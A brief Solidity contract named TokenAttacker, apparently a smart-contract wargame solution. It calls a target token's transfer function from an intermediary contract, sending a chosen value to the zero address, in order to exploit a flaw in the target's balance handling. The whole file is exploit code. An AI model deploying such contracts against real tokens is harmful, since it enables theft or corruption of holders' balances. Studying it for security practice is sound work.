// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function transfer(address _to, uint _value) external;
}

contract TokenAttacker {
    targetInterface target;

    constructor(address targetAddress) {
        target = targetInterface(targetAddress);
    }

    function attack(uint value) public {
        target.transfer(address(0), value);
    }
}
